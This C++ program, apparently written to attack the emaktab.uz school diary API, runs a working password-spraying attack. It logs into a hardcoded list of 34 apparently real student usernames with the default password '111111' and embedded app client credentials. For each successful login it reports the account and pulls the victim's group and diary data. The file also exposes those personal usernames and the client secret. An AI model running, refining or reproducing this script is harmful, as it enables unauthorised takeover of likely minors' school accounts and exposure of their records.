#include <iostream>
#include <string>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <chrono>
#include <vector>

using json = nlohmann::json;

// Global Callback
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    size_t total = size * nmemb;
    userp->append((char*)contents, total);
    return total;
}

struct GroupPersonIds {
    std::string group_id;
    std::string person_id;
    bool success = false; // Added flag to handle errors gracefully
};

GroupPersonIds get_groups_id(const std::string& AccessToken, const std::string& userId) {
    CURL* curl = curl_easy_init();
    GroupPersonIds ids;
    if (curl) {
        std::string readBuffer;
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, ("Access-Token: " + AccessToken).c_str());
        headers = curl_slist_append(headers, "Cookie: Dnevnik_localization=uz-Latn-UZ; a_r_p_i=18.1");
        headers = curl_slist_append(headers, "Accept: application/json");

        std::string url = "https://api.emaktab.uz/mobile/v10.0/users/" + userId + "/context";
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L); // Safety timeout

        CURLcode res = curl_easy_perform(curl);
        
        if (res == CURLE_OK) {
            try {
                auto result = json::parse(readBuffer);
                // SAFETY CHECK: Ensure the keys exist before accessing [0]
                if (result.contains("contextPersons") && !result["contextPersons"].empty()) {
                    ids.group_id = result["contextPersons"][0]["group"]["id"].get<int>();
                    ids.person_id = result["info"]["personId"].get<int>();
                    ids.success = true;
                }
            } catch (json::exception& e) {
                std::cerr << "JSON Error in get_groups_id: " << e.what() << std::endl;
            }
        }

        // CRITICAL FIX: Memory cleanup
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    return ids;
}

std::string check_dairy(const std::string& AccessToken, const std::string& userId) {
    auto ids = get_groups_id(AccessToken, userId);
    if (!ids.success) return "failed_to_get_ids";

    CURL* curl = curl_easy_init();
    std::string status = "error";
    if (curl) {
        std::string readBuffer;
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, ("Access-Token: " + AccessToken).c_str());
        headers = curl_slist_append(headers, "Cookie: Dnevnik_localization=uz-Latn-UZ; a_r_p_i=18.1");
        headers = curl_slist_append(headers, "Accept: application/json");

        // Fixed the URL (Removed the trailing ?id= unless you actually have an ID to pass)
        std::string url = "https://api.emaktab.uz/mobile/v10.0/persons/" + ids.person_id + "/groups/" + ids.group_id + "/diary";
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        if (curl_easy_perform(curl) == CURLE_OK) {
            try {
                auto result = json::parse(readBuffer);
                if (result.contains("type") && result["type"] == "systemForbidden") {
                    std::cout << "Forbidden for IDs: " << ids.person_id << std::endl;
                } else {
                    status = "success";
                }
            } catch (...) { status = "parse_error"; }
        }
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    return status;
}

void loginIn(const std::string& username) {
    CURL* curl = curl_easy_init();
    if (!curl) return;

    std::string readBuffer;
    json j = {
        {"clientId", "B70AECAA-A0E2-4E0D-A147-2D6051A1397B"},
        {"clientSecret", "C0A8880F-30CA-4877-ADD2-26ED9672EC93"},
        {"scope", "Schools,Relatives,EduGroups,Lessons,marks,EduWorks,Avatar"},
        {"username", username},
        {"password", "111111"},
        {"agreeTerms", "false"}
    };

    std::string jsonString = j.dump();
    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "Cookie: Dnevnik_localization=uz-Latn-UZ; a_r_p_i=18.1");
    headers = curl_slist_append(headers, "Accept: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, "https://api.emaktab.uz/mobile/v10.0/authorizations/bycredentials");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonString.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

    if (curl_easy_perform(curl) == CURLE_OK) {
        try {
            auto result = json::parse(readBuffer);
            if (result.contains("type") && result["type"] == "Success") {
                std::cout << "[+] Login: " << username << std::endl;

                // 1. Get the Token (This is already a string in the JSON)
                std::string token = result["credentials"]["accessToken"].get<std::string>();

                // 2. FIX: Get userId as a number first, then convert to string
                // We use long long because 1000016875263 is too big for a standard int
                long long userIdNum = result["credentials"]["userId"].get<long long>();
                std::string userId = std::to_string(userIdNum);

                check_dairy(token, userId);
            }
            else{
                std::cout << "[!] FAILED LOGIN: " << username << std::endl;
            }
        } catch (const std::exception& e) {
            std::cerr << "!!! EXCEPTION: " << e.what() << std::endl;
        }
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

int main() {
    // CRITICAL: Initialize ONCE at the very start of main
    curl_global_init(CURL_GLOBAL_ALL);

    std::vector<std::string> people = {"abdumalikovibrohim02",
    "gabdurahimova0211201",
    "mushtaryi",
    "dilshoda.alijonova06",
    "alimjonov_husan",
    "fotima.alimjonova052",
    "madina.ataboyeva1020",
    "muhbubaxonaxmedova",
    "akbarshoh_azimov",
    "firdavsismoilov03201",
    "jabbarovamubinabonu",
    "kumishjalolova",
    "jamoliddinovazarina",
    "r.karimjonova0611201",
    "sayyodbekkarimov",
    "oisha.kasimova",
    "marupjonovamubina",
    "meliqulova_diyora",
    "miramatjonov",
    "muxriddinovabubakr",
    "ortikovamubinaxon",
    "aqidaraximjanova",
    "s.mavludahon",
    "tojidinovamalikaxon",
    "nigina.tursunboyeva1",
    "ziyoda.umarova300420",
    "u_ziyoviddin",
    "mubosherv",
    "jahongirxamidilloyev",
    "shaxnoza.rahimova102",
    "azizbek.yunusov20072",
    "mustafo.yunusov10201",
    "ruhshona.yunusova082",
    "zahidjanov"}; // ... add the rest

    auto start = std::chrono::high_resolution_clock::now();
    for (const auto& person : people) {
        loginIn(person);
    }
    auto end = std::chrono::high_resolution_clock::now();

    curl_global_cleanup(); // Clean up once at the end
    
    std::chrono::duration<double> elapsed = end - start;
    std::cout << "Processed in: " << elapsed.count() << "s" << std::endl;
    return 0;
}
